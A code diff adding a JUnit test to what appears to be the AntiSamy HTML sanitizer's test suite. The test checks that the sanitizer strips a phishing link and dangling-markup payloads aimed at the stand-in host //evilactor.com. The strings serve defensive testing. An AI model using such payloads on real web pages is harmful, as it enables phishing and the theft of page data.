@@ -1425,4 +1425,37 @@ static final String test33 = "<html>\n"
         assertThat(as.scan(test40, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("<svg onload=alert(1)//")));
         //System.out.println("DOM parser: " + as.scan(test40, policy, AntiSamy.DOM).getCleanHTML());
     }
+
+    @Test
+    public void testGithubIssue48() throws ScanException, PolicyException {
+
+        // Concern is that onsiteURL regex is not safe for URLs that start with //.
+        // For example:  //evilactor.com?param=foo
+
+        final String phishingAttempt = "<a href=\"//evilactor.com/stealinfo?a=xxx&b=xxx\"><span style=\"color:red;font-size:100px\">"
+                + "You must click me</span></a>";
+
+        // Output: <a rel="nofollow"><span style="color: red;font-size: 100.0px;">You must click me</span></a>
+
+        assertThat(as.scan(phishingAttempt, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("//evilactor.com/")));
+        assertThat(as.scan(phishingAttempt, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("//evilactor.com/")));
+
+        // This ones never failed, they're just to prove a dangling markup attack on the following resulting HTML won't work.
+        // Less probable case (steal more tags):
+        final String danglingMarkup = "<div>User input: " +
+                "<input type=\"text\" name=\"input\" value=\"\"><a href='//evilactor.com?"+
+                "\"> all this info wants to be stolen with <i>danlging markup attack</i>" +
+                " until a single quote to close is found'</div>";
+
+        assertThat(as.scan(danglingMarkup, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("//evilactor.com/")));
+        assertThat(as.scan(danglingMarkup, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("//evilactor.com/")));
+
+        // More probable case (steal just an attribute):
+        //      HTML before attack: <input type="text" name="input" value="" data-attribute-to-steal="some value">
+        final String danglingMarkup2 = "<div>User input: " +
+                "<input type=\"text\" name=\"input\" value=\"\" data-attribute-to-steal=\"some value\">";
+        
+        assertThat(as.scan(danglingMarkup2, policy, AntiSamy.SAX).getCleanHTML(), not(containsString("//evilactor.com/")));
+        assertThat(as.scan(danglingMarkup2, policy, AntiSamy.DOM).getCleanHTML(), not(containsString("//evilactor.com/")));
+    }
 }
